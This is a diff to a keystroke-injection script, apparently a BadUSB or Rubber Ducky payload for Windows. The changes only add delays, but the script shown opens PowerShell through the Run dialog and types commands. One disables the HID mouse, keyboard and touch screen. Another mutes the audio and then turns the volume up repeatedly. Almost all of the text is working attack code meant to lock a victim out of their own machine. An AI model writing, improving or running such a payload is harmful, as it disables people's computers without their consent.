@@ -17,6 +17,7 @@ GUI r
 DELAY 500
 STRING powershell
 ENTER
+DELAY 2000
 STRING Disable-Device -FriendlyName 'HID-compliant mouse'; Disable-Device -FriendlyName 'HID Keyboard Device'; Disable-Device -FriendlyName 'HID-compliant touch screen'
 ENTER
 DELAY 1000
@@ -24,6 +25,7 @@ GUI r
 DELAY 500
 STRING powershell
 ENTER
+DELAY 2000
 STRING (New-Object -ComObject wscript.shell).SendKeys([char]173); Start-Sleep 1; for ($i = 0; $i -lt 50; $i++) { (New-Object -ComObject wscript.shell).SendKeys([char]175); Start-Sleep 0.1 }
 ENTER
 DELAY 1000
